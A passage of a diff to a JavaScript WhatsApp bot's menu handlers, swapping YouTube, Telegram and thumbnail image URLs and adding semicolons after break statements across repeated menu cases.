 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -20248,11 +19777,11 @@ let msg = generateWAMessageFromContent(m.chat, {
             buttons: [
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -20310,11 +19839,11 @@ let msg = generateWAMessageFromContent(m.chat, {
                   buttons: [
              {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -20395,11 +19924,11 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -20439,9 +19968,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'downloadmenu': {
 let xmenu_oh = `
 ╭──❍「 *GREETING* 」❍
@@ -20579,7 +20107,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -20605,7 +20133,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://imgur.com/a/Kx2xDAw",
+thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -20638,11 +20166,11 @@ let msg = generateWAMessageFromContent(m.chat, {
             buttons: [
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -20700,11 +20228,11 @@ let msg = generateWAMessageFromContent(m.chat, {
                   buttons: [
              {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -20785,11 +20313,11 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -20829,9 +20357,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'toolmenu': {
 let xmenu_oh = `
 ╭──❍「 *GREETING* 」❍
@@ -20986,7 +20513,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -21012,7 +20539,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://imgur.com/a/Kx2xDAw",
+thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -21045,11 +20572,11 @@ let msg = generateWAMessageFromContent(m.chat, {
             buttons: [
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -21107,11 +20634,11 @@ let msg = generateWAMessageFromContent(m.chat, {
                   buttons: [
              {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -21192,11 +20719,11 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -21236,9 +20763,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'listmenu': {
 let xmenu_oh = `
 ╭──❍「 *GREETING* 」❍
@@ -21362,7 +20888,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -21388,7 +20914,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://imgur.com/a/Kx2xDAw",
+thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -21421,11 +20947,11 @@ let msg = generateWAMessageFromContent(m.chat, {
             buttons: [
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -21483,11 +21009,11 @@ let msg = generateWAMessageFromContent(m.chat, {
                   buttons: [
              {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -21568,11 +21094,11 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -21612,9 +21138,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'randomphotomenu': {
 let xmenu_oh = `
 ╭──❍「 *GREETING* 」❍
@@ -21783,7 +21308,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -21809,7 +21334,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://imgur.com/a/Kx2xDAw",
+thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -21842,11 +21367,11 @@ let msg = generateWAMessageFromContent(m.chat, {
             buttons: [
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -21904,11 +21429,11 @@ let msg = generateWAMessageFromContent(m.chat, {
                   buttons: [
              {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -21989,11 +21514,11 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -22033,9 +21558,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'randomvideomenu': {
 let xmenu_oh = `
 ╭──❍「 *GREETING* 」❍
@@ -22155,7 +21679,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -22181,7 +21705,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://imgur.com/a/Kx2xDAw",
+thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -22214,11 +21738,11 @@ let msg = generateWAMessageFromContent(m.chat, {
             buttons: [
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -22276,11 +21800,11 @@ let msg = generateWAMessageFromContent(m.chat, {
                   buttons: [
              {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -22361,11 +21885,11 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -22405,9 +21929,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stalkermenu': {
 let xmenu_oh = `
 ╭──❍「 *GREETING* 」❍
@@ -22523,7 +22046,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -22549,7 +22072,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://imgur.com/a/Kx2xDAw",
+thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -22582,11 +22105,11 @@ let msg = generateWAMessageFromContent(m.chat, {
             buttons: [
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -22644,11 +22167,11 @@ let msg = generateWAMessageFromContent(m.chat, {
                   buttons: [
              {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -22729,11 +22252,11 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -22773,9 +22296,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'aimenu': {
 let xmenu_oh = `
 ╭──❍「 *GREETING* 」❍
@@ -22906,7 +22428,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -22932,7 +22454,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://imgur.com/a/Kx2xDAw",
+thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -22965,11 +22487,11 @@ let msg = generateWAMessageFromContent(m.chat, {
             buttons: [
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -23027,11 +22549,11 @@ let msg = generateWAMessageFromContent(m.chat, {
                   buttons: [
              {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -23112,11 +22634,11 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -23156,9 +22678,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'gamemenu': {
 let xmenu_oh = `
 ╭──❍「 *GREETING* 」❍
@@ -23284,7 +22805,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -23310,7 +22831,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: ownername,
 body: botname,
-thumbnailUrl: "https://imgur.com/a/Kx2xDAw",
+thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
 sourceUrl: websitex,
 mediaType: 1,
 renderLargerThumbnail: true
@@ -23343,11 +22864,11 @@ let msg = generateWAMessageFromContent(m.chat, {
             buttons: [
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -23405,11 +22926,11 @@ let msg = generateWAMessageFromContent(m.chat, {
                   buttons: [
              {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/XenonBotInc\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
@@ -23490,11 +23011,11 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon1\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Dr_Xenon2\",\"merchant_url\":\"https://www.google.com\"}"
               },
               {
                  "name": "cta_url",
